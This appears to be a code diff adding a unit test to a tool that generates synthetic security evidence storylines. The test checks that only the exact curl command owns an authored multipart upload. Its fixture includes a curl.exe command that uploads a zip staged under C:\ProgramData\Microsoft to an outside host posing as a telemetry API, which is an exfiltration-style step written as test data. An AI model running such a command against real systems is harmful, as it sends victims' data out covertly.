@@ -26,6 +26,7 @@ from evidenceforge.generation.engine.storyline import (
     _estimate_process_lifetime,
     _linux_shell_process_command_line,
     _linux_storyline_shell_friction_commands,
+    _process_owns_storyline_multipart_upload,
     _render_storyline_shell_friction_template,
 )
 from evidenceforge.generation.state_manager import StateManager
@@ -3791,6 +3792,54 @@ class TestStorylineCommandSideEffects:
         part = entity.leaf_parts()[0]
         assert part.local_source_filename == "report.zip"
         assert part.wire_filename == "report.zip"
+
+    def test_authored_multipart_upload_requires_exact_curl_command_owner(self):
+        """A neighboring curl probe cannot own an authored multipart upload."""
+
+        spec = ConnectionEventSpec.model_validate(
+            {
+                "dst_ip": "45.33.32.30",
+                "dst_port": 443,
+                "hostname": "api.westbridge-services.net",
+                "method": "POST",
+                "uri": "/upload/telemetry/7f3a2b19",
+                "request_multipart": {
+                    "media_type": "multipart/form-data",
+                    "parts": [
+                        {
+                            "name": "archive",
+                            "body_len": 18_782_613,
+                            "local_source_path": r"C:\ProgramData\Microsoft\cache_7f3a.zip",
+                            "filename": "cache_7f3a.zip",
+                        }
+                    ],
+                },
+            }
+        )
+        upload = SimpleNamespace(
+            command_line=(
+                r"C:\Windows\System32\curl.exe --proxy http://10.10.3.20:8080 "
+                r'-F "archive=@C:\ProgramData\Microsoft\cache_7f3a.zip" '
+                "https://api.westbridge-services.net/upload/telemetry/7f3a2b19"
+            )
+        )
+        probe = SimpleNamespace(
+            command_line=(
+                "curl.exe --proxy http://PROXY-01.meridianhcs.local:8080 "
+                '"https://api.westbridge-services.net/"'
+            )
+        )
+
+        assert _process_owns_storyline_multipart_upload(
+            upload,
+            r"C:\Windows\System32\curl.exe",
+            spec,
+        )
+        assert not _process_owns_storyline_multipart_upload(
+            probe,
+            r"C:\Windows\System32\curl.exe",
+            spec,
+        )
 
     def test_literal_or_stdin_curl_body_does_not_invent_local_file(self):
         """Inline data and stdin are request entities but are not endpoint file reads."""
